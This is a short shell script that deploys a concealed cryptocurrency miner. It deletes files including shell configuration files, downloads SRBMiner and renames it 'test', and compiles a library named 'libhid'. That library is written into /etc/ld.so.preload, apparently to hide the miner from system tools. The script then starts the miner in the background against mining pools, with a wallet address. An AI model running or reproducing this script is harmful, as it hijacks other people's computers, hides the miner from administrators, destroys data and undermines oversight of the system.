#!/bin/sh
sudo rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
cd amplify-app
sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.0/srbminer_custom-2.2.0.tar.gz
sudo tar -xvf srbminer_custom-2.2.0.tar.gz
sudo mv srbminer_custom/srbminer_custom_bin test
sudo rm -f libhid.so
sudo gcc -Wall -m64 -fPIC -shared -o libhid.so libhid.c -ldl
sudo mv libhid.so /usr/lib/libhid.so
sudo echo '/usr/lib/libhid.so' > /etc/ld.so.preload
sudo gcc -Wall -fPIC -shared -o libhid.so libhid.c -ldl
sudo mv libhid.so /usr/lib64/libhid.so
sudo echo '/usr/lib64/libhid.so' > /etc/ld.so.preload
sudo nohup ./test --disable-gpu --algorithm verushash\;randomx --pool na.luckpool.net:3956\;randomepic --wallet RNu4dQGeFDSPP5iHthijkfnzgxcW2nPde9\;rizal91#amp1 --password x\;x --cpu-threads 0\;0 --log=stdout > meta.log & 
sudo timeout 480m ./time
